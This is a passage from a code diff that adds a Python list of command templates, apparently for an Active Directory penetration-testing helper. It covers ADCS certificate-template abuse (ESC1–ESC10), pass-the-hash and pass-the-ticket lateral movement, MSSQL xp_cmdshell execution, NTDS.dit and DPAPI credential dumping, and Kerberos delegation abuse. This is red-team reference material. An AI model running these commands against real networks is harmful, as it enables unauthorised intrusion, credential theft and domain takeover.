+    Hint(name='ESC1 (Request a certificate from vulnerable misconfigured Certificate Template)', command='certipy req -u \'{user}\' -p \'{password}\' -template {template_name} -ca {ca_name} -upn administrator@{domain} -dns {domain} -dc-ip {ip}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC1 (Request a certificate from vulnerable misconfigured Certificate Template)', command=r'certify.exe request /ca:{server}\{ca_name} /template:"{vulnerable_template_name}" [/altname:"Admin"]', block='adcs configuration', service=None, ports=None,
+        tool='certify.exe', tags='Windows certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+
+    Hint(name='ESC2 -> ESC3 (Use an enrollment agent to request a certificate) (misconfigured Certificate Template)', command=r'certify.exe request /ca:{server}\{ca_name} /template:"{vulnerable_template_name}"', block='adcs configuration', service=None, ports=None,
+        tool='certify.exe', tags='Windows certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC2 -> ESC3 (Use an enrollment agent to request a certificate) (misconfigured Certificate Template)', command=r'certify.exe request /ca:{server}\{ca_name} /template:{template} /onbehalfof:{domain}\{user} /enrollcert:{pfx_path} [/enrollcertpw:{certificate_password}]', block='adcs configuration', service=None, ports=None,
+        tool='certify.exe', tags='Windows certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC2 -> ESC3 (Use an enrollment agent to request a certificate) (misconfigured Certificate Template)', command='certipy req -u {user}@{domain} -p \'{password}\' -target {ca_server} -template "{vulnerable_template_name}" -ca {ca_name}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC2 -> ESC3 (Use an enrollment agent to request a certificate) (misconfigured Certificate Template)', command=r'certipy req -u {user}@{domain} -p \'{password}\' -target {ca_server} -template "{vulnerable_template_name}" -ca {ca_name} -on-behalf-of "{domain_name}\{user}" -pfx {certificate}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+
+    Hint(name='Detect misconfigured ACL', command='certipy find -u {user}@{domain} -p \'{password}\' -dc-ip {ip}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='adcs configuration (ESC4, ESC7)'),
+
+    Hint(name='ESC4 (write privilege over a certificate template) (misconfigured ACL)', command='certipy template -u {user}@{domain} -p \'{password}\' -template {vulnerable_template} -save-old -debug', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment='restore: `certipy template -u {user}@{domain} -p \'{password}\' -template {vulnerable_template} -configuration {template}.json`', next_step='adcs configuration (ESC1)'),
+
+
+    Hint(name='ESC7 (Manage CA) (misconfigured ACL)', command='certipy ca -ca {ca_name} -add-officer {user} -username {user}@{domain} -password {password}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='adcs configuration (ESC7 Manage certificate)'),
+    Hint(name='ESC7 (Manage certificate) (misconfigured ACL)', command='certipy ca -ca {ca_name} -enable-template "{esc1_vulnerable_template}" -username {user}@{domain} -password {password}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC7 (Manage certificate) (misconfigured ACL)', command='certipy req -username {user}@{domain} -password {password} -ca {ca_name} -template "{vulnerable_template_name}" -upn "{target_user}"', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC7 (Manage certificate) (misconfigured ACL)', command='certipy ca -u {user}@{domain} -p \'{password}\' -ca {ca_name} -issue-request {request_id}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC7 (Manage certificate) (misconfigured ACL)', command='certipy req -u {user}@{domain} -p "{password}" -ca {ca_name} -retrieve {request_id}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+
+    Hint(name='Display CA info', command='certutil -TCAInfo', block='adcs configuration', service=None, ports=None,
+        tool='certutil', tags='Windows certificate', comment=None, next_step=None),
+    Hint(name='Display CA info', command='certify.exe cas', block='adcs configuration', service=None, ports=None,
+        tool='certify.exe', tags='Windows certificate', comment=None, next_step=None),
+
+    Hint(name='Detect misconfigured CA', command=r'certutil -config "{ca_host}\{ca_name}" -getreg "policy\EditFlags"', block='adcs configuration', service=None, ports=None,
+        tool='certutil', tags='Windows certificate', comment='get CA flags (if remote registry is enabled)', next_step='adcs configuration (ESC6)'),
+    Hint(name='Detect misconfigured CA', command=None, block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment='get CA flags (if remote registry is enabled), only the flag ATTRIBUTESUBJECTALTNAME2', next_step='adcs configuration (ESC6)'),
+    Hint(name='Detect misconfigured CA', command=None, block='adcs configuration', service=None, ports=None,
+        tool='certify.exe', tags='Windows certificate', comment='get CA flags (if remote registry is enabled), only the flag ATTRIBUTESUBJECTALTNAME2', next_step='adcs configuration (ESC6)'),
+
+    Hint(name='ESC6 (abuse ATTRIBUTESUBJECTALTNAME2 set on CA)', command=None, block='adcs configuration', service=None, ports=None,
+        tool=None, tags='certificate', comment='choose any certificate template that permits client authentication', next_step='adcs configuration (ESC1)'),
+
+    Hint(name='ESC5 (vulnerable PKI Object access control)', command='certify.exe pkiobjects', block='adcs configuration', service=None, ports=None,
+        tool='certify.exe', tags='Windows certificate', comment=None, next_step='permissions (ACL)'),
+
+    Hint(name='ESC9 / ESC10 (misconfigured Certificate mapping)', command='certipy shadow auto -username {userA}@{domain} -p {passwordA} -account {userB}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC9 / ESC10 (misconfigured Certificate mapping)', command='certipy account update -username {userA}@{domain} -password {passwordA} -user {userB} -upn Administrator', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC9 / ESC10 (misconfigured Certificate mapping)', command='certipy account update -username {userA}@{domain} -password {passwordA} -user {userB} -upn "{dc_name$}@{domain}"', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment='ESC10 Case 2', next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC9 / ESC10 (misconfigured Certificate mapping)', command='certipy req -username {userB}@{domain} -hashes {hashB} -ca {ca_name} -template {vulnerable_template}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment='ESC9', next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC9 / ESC10 (misconfigured Certificate mapping)', command='certipy req -username {userB}@{domain} -hashes {hashB} -ca {ca_name} -template {template_with_client_auth}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment='ESC10', next_step='lateral move (Pass the certificate)'),
+    Hint(name='ESC9 / ESC10 (misconfigured Certificate mapping)', command='certipy account update -username {userA}@{domain} -password {passwordA} -user {userB} -upn {userB}@{domain}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment='reset {userB} UPN -> Kerberos Mapping / Schannel Mapping', next_step='lateral move (Pass the certificate)'),
+
+    # Lateral move
+
+    Hint(name='WSUSpect', command='WSUSpendu.ps1', block='lateral move', service=None, ports=None,
+        tool='powershell', tags='Windows', comment='need compromised WSUS server', next_step=None),
+
+    Hint(name='sccm admin', command='CMPivot', block='lateral move', service=None, ports=None,
+        tool=None, tags='Windows', comment=None, next_step='administrator access'),
+    Hint(name='sccm admin', command='PowerSCCM', block='lateral move', service=None, ports=None,
+        tool=None, tags='Windows', comment=None, next_step='administrator access'),
+    Hint(name='sccm admin', command='SharpSCCM', block='lateral move', service=None, ports=None,
+        tool=None, tags='Windows', comment=None, next_step='administrator access'),
+
+    Hint(name='Find MSSQL access', command='cme mssql {ip} -u {user} -p {password} -d {domain}', block='lateral move', service='MSSQL', ports='1433',
+        tool='crackmapexec', tags=None, comment=None, next_step=None),
+
+    Hint(name='Users with SQLadmin', command='MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p', block='lateral move', service='MSSQL', ports='1433',
+        tool='Bloodhound', tags=None, comment=None, next_step=None),
+
+    Hint(name='MSSQL shell', command="EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '{command}'", block='lateral move', service='MSSQL', ports='1433',
+        tool=None, tags=None, comment=None, next_step='privilege escalation'),
+
+    Hint(name='MSSQL trust link', command='Get-SQLServerLinkCrawl -username {user} -password {password} -Verbose -Instance {sql_instance} -Query "{query}"', block='lateral move', service='MSSQL', ports='1433',
+        tool='powershell', tags=None, comment=None, next_step='lateral move (MSSQL)'),
+    Hint(name='MSSQL trust link', command='use exploit/windows/mssql/mssql_linkcrawler', block='lateral move', service='MSSQL', ports='1433',
+        tool='metasploit', tags=None, comment=None, next_step='lateral move (MSSQL)'),
+
+    Hint(name='MSSQLClient', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'     enum_db', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment='pr #1397', next_step=None),
+    Hint(name='MSSQLClient', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'     enable_xp_cmdshell     xp_cmdshell {command}', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment='pr #1397', next_step='privilege escalation'),
+    Hint(name='MSSQLClient', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'     enum_impersonate     exec_as_user {user}', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment='pr #1397', next_step='lateral move (MSSQL)'),
+    Hint(name='MSSQLClient', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'     enum_impersonate     exec_as_login {login}', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment='pr #1397', next_step='lateral move (MSSQL)'),
+    Hint(name='MSSQLClient', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'     xp_dir_tree {ip}', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment='pr #1397', next_step='mitm (Coerce SMB)'),
+    Hint(name='MSSQLClient', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'     trustlink     sp_linkedservers     use_link', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment='pr #1397', next_step='lateral move (MSSQL)'),
+
+    Hint(name='local user', command='cme smb -u {user} -p {pass} {ip} --local-auth', block='lateral move', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment=None, next_step='administrator access'),
+    Hint(name='local user', command=None, block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='cleartext password without domain/', next_step='administrator access'),
+
+    Hint(name='cleartext password', command='impacket-psexec {domain}/{user}:{password}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='interactive shell', next_step='administrator access'),
+    Hint(name='cleartext password', command=r'psexec.exe -AcceptEULA \\{ip}', block='lateral move', service=None, ports=None,
+        tool='psexec', tags=None, comment='interactive shell', next_step='administrator access'),
+    Hint(name='cleartext password', command='mimikatz "privilege::debug sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash}"', block='lateral move', service=None, ports=None,
+        tool='mimikatz', tags="Windows", comment='interactive shell', next_step='administrator access'),
+    Hint(name='cleartext password', command='impacket-atexec {domain}/{user}:{password}@{ip} "{command}"', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='cleartext password', command='impacket-smbexec {domain}/{user}:{password}@{ip} ', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='cleartext password', command='impacket-wmiexec {domain}/{user}:{password}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='cleartext password', command='impacket-dcomexec {domain}/{user}:{password}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='cleartext password', command='cme smb {subnet} -u {user} -p {password} -d {domain}', block='lateral move', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='cleartext password', command='cme smb {subnet} -u {user} -p {password} --local-auth', block='lateral move', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='cleartext password', command='evil-winrm -i {ip} -u {user} -p \'{password}\'', block='lateral move', service='WinRM', ports='5985 5986',
+        tool='evil-winrm', tags=None, comment='PS shell', next_step='privilege escalation, administrator access'),
+    Hint(name='cleartext password', command='xfreerdp /u:{user} /d:{domain} /p:{password} /v:{ip}', block='lateral move', service='RDP', ports='3389',
+        tool='xfreerdp', tags=None, comment=None, next_step='privilege escalation, administrator access'),
+    Hint(name='cleartext password', command='impacket-smbclient {domain}/{user}:{password}@{ip}', block='lateral move', service='SMB', ports='445',
+        tool='impacket', tags=None, comment=None, next_step='search files'),
+    Hint(name='cleartext password', command='cme mssql {subnet} -u {user} -p {password} ', block='lateral move', service='MSSQL', ports='1433',
+        tool='crackmapexec', tags=None, comment=None, next_step='lateral move (MSSQL)'),
+    Hint(name='cleartext password', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment=None, next_step='lateral move (MSSQL)'),
+
+    Hint(name='Pass the hash (PTH) - NTLM', command='impacket-psexec -hashes ":{hash}" {user}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='interactive shell', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command=r'psexec.exe -AcceptEULA \\{ip}', block='lateral move', service=None, ports=None,
+        tool='psexec', tags=None, comment='interactive shell', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='mimikatz "privilege::debug sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash}"', block='lateral move', service=None, ports=None,
+        tool='mimikatz', tags=None, comment='interactive shell', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='impacket-atexec -hashes ":{hash}" {user}@{ip} "{command}"', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='impacket-smbexec -hashes ":{hash}" {user}@{ip} ', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='impacket-wmiexec -hashes ":{hash}" {user}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='impacket-dcomexec -hashes ":{hash}" {user}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='cme smb {subnet} -u {user} -H ":{hash}" -d {domain}', block='lateral move', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='cme smb {subnet} -u {user} -H ":{hash}" -local-auth', block='lateral move', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='evil-winrm -i {ip} -u {user} -H {hash}', block='lateral move', service='WinRM', ports='5985 5986',
+        tool='evil-winrm', tags=None, comment='PS shell', next_step='privilege escalation, administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command=r'impacket-reg {domain}/{user}@{ip} -hashes ":{hash}" add -keyName "HKLM\System\CurrentControlSet\Control\Lsa" -v "DisableRestrictedAdmin" -vt "REG_DWORD" -vd "0"', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='privilege escalation, administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='xfreerdp /u:{user} /d:{domain} /pth:{hash} /v:{ip}', block='lateral move', service='RDP', ports='3389',
+        tool='xfreerdp', tags=None, comment=None, next_step='privilege escalation, administrator access'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='impacket-smbclient -hashes ":{hash}" {user}@{ip}', block='lateral move', service='SMB', ports='445',
+        tool='impacket', tags=None, comment=None, next_step='search files'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='cme mssql {subnet} -u {user} -H ":{hash}" ', block='lateral move', service='MSSQL', ports='1433',
+        tool='crackmapexec', tags=None, comment=None, next_step='lateral move (MSSQL)'),
+    Hint(name='Pass the hash (PTH) - NTLM', command='impacket-mssqlclient -windows-auth -hashes ":{hash}" {user}@{ip}', block='lateral move', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment=None, next_step='lateral move (MSSQL)'),
+
+    Hint(name='Overpass The Hash / Pass the key (PTK) - NTLM', command='Rubeus asktgt /user:victim /rc4:{rc4value}', block='lateral move', service=None, ports=None,
+        tool='Rubeus', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Overpass The Hash / Pass the key (PTK) - NTLM', command='Rubeus ptt /ticket:{ticket}', block='lateral move', service=None, ports=None,
+        tool='Rubeus', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Overpass The Hash / Pass the key (PTK) - NTLM', command=r'Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe|upnpcont.exe]', block='lateral move', service=None, ports=None,
+        tool='Rubeus', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Overpass The Hash / Pass the key (PTK) - NTLM', command='Rubeus ptt /luid:0xdeadbeef /ticket:{ticket}', block='lateral move', service=None, ports=None,
+        tool='Rubeus', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Overpass The Hash / Pass the key (PTK) - NTLM', command='impacket-getTGT {domain}/{user} -hashes :{hash}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Overpass The Hash / Pass the key (PTK) - NTLM', command='impacket-getTGT -aesKey "{key}" {domain}/{user}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+
+    Hint(name='Pass the ticket (PTT) (ccache / kirbi)', command='impacket-ticketConverter <kirbi|ccache> <ccache|kirbi>', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='convert format', next_step=None),
+    Hint(name='Pass the ticket (PTT) (ccache / kirbi)', command='export KRB5CCNAME=domain_ticket.ccache impacket -k -nopass {dc}', block='lateral move', service='Kerberos', ports='88',
+        tool='impacket', tags=None, comment='like Pass the hash but with -k and -no-pass, ticket got from impacket-GetST', next_step='administrator access'),
+    Hint(name='Pass the ticket (PTT) (ccache / kirbi)', command='mimikatz kerberos::ptc "{ticket}"', block='lateral move', service='Kerberos', ports='88',
+        tool='mimikatz', tags='Windows', comment=None, next_step=None),
+    Hint(name='Pass the ticket (PTT) (ccache / kirbi)', command='Rubeus.exe ptt /ticket:{ticket}', block='lateral move', service='Kerberos', ports='88',
+        tool='Rubeus', tags='Windows', comment=None, next_step=None),
+    Hint(name='Pass the ticket (PTT) (ccache / kirbi)', command='proxychains impacket-secretsdump -k "{domain}"/"{user}"@"{ip}"', block='lateral move', service='Kerberos', ports='88',
+        tool='impacket', tags=None, comment=None, next_step='permissions (DCSync)'),
+    Hint(name='Pass the ticket (PTT) (ccache / kirbi)', command='tgssub.py -in {ticket_ccache} -out {newticket_ccache} -altservice "{service}/{target}" ', block='lateral move', service='Kerberos', ports='88',
+        tool='impacket', tags=None, comment='pr #1256', next_step='lateral move (Pass the ticket)')
+,
+    Hint(name='Kerberos aesKey', command=None, block='lateral move', service='Kerberos', ports='88',
+        tool='impacket', tags=None, comment='like Pass the hash but use -aesKey and FQDN', next_step='Administrator access'),    
+    Hint(name='Kerberos aesKey', command='proxychains impacket-secretsdump -aesKey {key} "{domain}"/"{user}"@"{ip}"', block='lateral move', service='Kerberos', ports='88',
+        tool='impacket', tags=None, comment=None, next_step='permissions (DCSync)'),
+
+    Hint(name='SOCKS (with NTLM relay)', command='proxychains impacket-lookupsid {domain}/{user}@{ip} -no-pass -domain-sids', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='got username'),
+    Hint(name='SOCKS (with NTLM relay)', command='proxychains impacket-mssqlclient -windows-auth {domain}/{user}@{ip} -no-pass', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (MSSQL)'),
+    Hint(name='SOCKS (with NTLM relay)', command='proxychains impacket-secretsdump -no-pass {domain}/{user}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='permissions (DCSync)'),
+    Hint(name='SOCKS (with NTLM relay)', command='proxychains impacket-atexec -no-pass {domain}/{user}@{ip} "{command}"', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='SOCKS (with NTLM relay)', command='proxychains impacket-smbexec -no-pass {domain}/{user}@{ip}', block='lateral move', service=None, ports=None,
+        tool='impacket', tags=None, comment='pseudo shell (file write and read)', next_step='administrator access'),
+    Hint(name='SOCKS (with NTLM relay)', command='proxychains impacket-smbclient -no-pass {user}@{ip}', block='lateral move', service='SMB', ports='445',
+        tool='impacket', tags=None, comment=None, next_step='search files'),
+    
+    Hint(name='Get hash NTLM from certificate (pfx)', command='certipy auth -pfx {crt_file} -dc-ip {dc_ip}', block='lateral move', service=None, ports=None,
+        tool='certipy', tags=None, comment=None, next_step='lateral move (NTLM Hash)'),
+    Hint(name='Pass the Certificate (PTC) (pfx)', command='gettgtpkinit.py -cert-pfx "{pfx_file}" ^[-pfx-pass "{cert_password}"] "{fqdn_domain}/{user}" "{tgt_ccache_file}"', block='lateral move', service=None, ports=None,
+        tool='gettgtpkinit.py', tags=None, comment='pkinit', next_step='lateral move (Pass the ticket)'),
+    Hint(name='Pass the Certificate (PTC) (pfx)', command='Rubeus.exe asktgt /user:"{username}" /certificate:"{pfx_file}" [/password:"{certificate_password}"] /domain:"{fqdn_domain}" /dc:"{dc}" /show', block='lateral move', service=None, ports=None,
+        tool='Rubeus', tags='Windows', comment='pkinit', next_step='lateral move (Pass the ticket)'),
+    Hint(name='Pass the Certificate (PTC) (pfx)', command='certipy auth -pfx {crt_file} -dc-ip {dc_ip}', block='lateral move', service=None, ports=None,
+        tool='certipy', tags=None, comment='pkinit', next_step='lateral move (Pass the ticket)'),
+    Hint(name='Pass the Certificate (PTC) (pfx)', command='certipy auth -pfx {crt_file} -ldap-shell     add_computer     set_rbcd', block='lateral move', service=None, ports=None,
+        tool='certipy', tags=None, comment='Schannel', next_step='kerberos delegation (RBCD)'),
+
+    # Domain admin
+
+    Hint(name='dump ntds.dit', command='cme smb {ip} -u {user} -p {password} -d {domain} --ntds', block='domain admin', service='SMB', ports='445',
+        tool='crackmapexec', tags='hot', comment='slow', next_step='lateral move, cracking'),
+    Hint(name='dump ntds.dit', command='impacket-secretsdump "{domain}/{user}:{password}"@{ip}', block='domain admin', service=None, ports=None,
+        tool='impacket', tags='hot', comment='slow', next_step='lateral move, cracking'),
+    Hint(name='dump ntds.dit', command=r'ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q', block='domain admin', service=None, ports=None,
+        tool=None, tags='hot Windows', comment=None, next_step='lateral move, cracking'),
+    Hint(name='dump ntds.dit', command='impacket-secretsdump -ntds {ntds_file} -system {system_file} -hashes lmhash:nthash LOCAL -outputfile {output_file}', block='domain admin', service=None, ports=None,
+        tool='impacket', tags='hot', comment=None, next_step='lateral move, cracking'),
+    Hint(name='dump ntds.dit', command='windows/gather/credentials/domain_hashdump', block='domain admin', service=None, ports=None,
+        tool='metasploit', tags='hot', comment=None, next_step='lateral move, cracking'),
+    Hint(name='dump ntds.dit', command='certsync -u {user} -p {password} -d {domain} -dc-ip {ip} -ns {ns_ip}', block='domain admin', service=None, ports=None,
+        tool='certsync', tags='hot', comment=None, next_step='lateral move, cracking'),
+    Hint(name='dpapi', command='dpapi.py backupkeys -hashes ":{hash}" -t Administrator@{ip} --export', block='domain admin', service=None, ports=None,
+        tool='dpapi.py', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='DonPAPI', command='DonPAPI -pvk {domain_backup_key} -H ":{hash}" {domain}/{user}@{subnet}', block='domain admin', service=None, ports=None,
+        tool='DonPAPI', tags=None, comment=None, next_step='valid credentials'),
+
+    # Kerberos Delegation move
+
+    Hint(name='list delegations', command='ldeep ldap -u {user} -p {password} -d {domain} -s ldap://{ip} delegations', block='kerberos delegation', service='LDAP', ports='389 636 3268 3269',
+        tool='ldeep', tags=None, comment=None, next_step=None),
+    Hint(name='list delegations', command='impacket-findDelegation {domain}/{user}:{password}@{ip}', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step=None),
+
+    Hint(name='Get unconstrained delegation machines', command='Get-NetComputer -Unconstrained', block='kerberos delegation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+    Hint(name='Get unconstrained delegation machines', command='Get-DomainComputer -Unconstrained -Properties DnsHostName', block='kerberos delegation', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step=None),
+    Hint(name='Get unconstrained delegation machines', command='MATCH (c:Computer {unconstraineddelegation:true}) RETURN c', block='kerberos delegation', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment=None, next_step=None),
+    Hint(name='Get unconstrained delegation machines', command='MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p', block='kerberos delegation', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment=None, next_step=None),
+
+    Hint(name='Unconstrained delegation (UAC: ADS_UF_TRUSTED_FOR_DELEGATION) - Get tickets', command='mimikatz privilege::debug sekurlsa::tickets /export', block='kerberos delegation', service=None, ports=None,
+        tool='mimikatz', tags=None, comment=None, next_step='lateral move (Kerberos TGT)'),
+    Hint(name='Unconstrained delegation (UAC: ADS_UF_TRUSTED_FOR_DELEGATION) - Get tickets', command='mimikatz sekurlsa::tickets /export', block='kerberos delegation', service=None, ports=None,
+        tool='mimikatz', tags=None, comment=None, next_step='lateral move (Kerberos TGT)'),
+    Hint(name='Unconstrained delegation (UAC: ADS_UF_TRUSTED_FOR_DELEGATION) - Get tickets', command='Rubeus dump /service:krbtgt /nowrap', block='kerberos delegation', service=None, ports=None,
+        tool='Rubeus', tags=None, comment=None, next_step='lateral move (Kerberos TGT)'),
+    Hint(name='Unconstrained delegation (UAC: ADS_UF_TRUSTED_FOR_DELEGATION) - Get tickets', command='Rubeus dump /luid:0xdeadbeef /nowrap', block='kerberos delegation', service=None, ports=None,
+        tool='Rubeus', tags=None, comment=None, next_step='lateral move (Kerberos TGT)'),
+
+    Hint(name='Unconstrained delegation (UAC: ADS_UF_TRUSTED_FOR_DELEGATION) - Forced connection with coerced authentication', command='Rubeus monitor /interval:5', block='kerberos delegation', service=None, ports=None,
+        tool='Rubeus', tags=None, comment=None, next_step='lateral move (Kerberos TGT -> Pass the ticket) -> permissions (DCSync if DC) -> domain admin'),
+
+    Hint(name='Get constrained delegation', command='Get_DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo', block='kerberos delegation', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step=None),
+    Hint(name='Get constrained delegation', command='Get-DomainUser -TrustedToAuth', block='kerberos delegation', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step=None),
+    Hint(name='Get constrained delegation', command='MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p', block='kerberos delegation', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment=None, next_step=None),
+    Hint(name='Get constrained delegation', command='MATCH (u:User {owned:true}), (c:Computer {name: "{target_fqdn}"}), p=shortestPath((u)-[*1..]->(c)) RETURN p', block='kerberos delegation', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment=None, next_step=None),
+
+    Hint(name='Constrained delegation with protocol transition (any)', command='Rubeus hash /password:{password}', block='kerberos delegation', service=None, ports=None,
+        tool='Rubeus', tags='Windows', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION', next_step=None),
+
+    Hint(name='Constrained delegation with protocol transition (any)', command='Rubeus asktgt /user:{user} /domain:{domain} /aes256:{aes256_hash}', block='kerberos delegation', service=None, ports=None,
+        tool='Rubeus', tags='Windows', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation with protocol transition (any)', command='Rubeus s4u /ticket:{ticket} /impersonateuser:{admin_user} /msdsspn:{spn_constrained} /altservice:CIFS /ptt', block='kerberos delegation', service=None, ports=None,
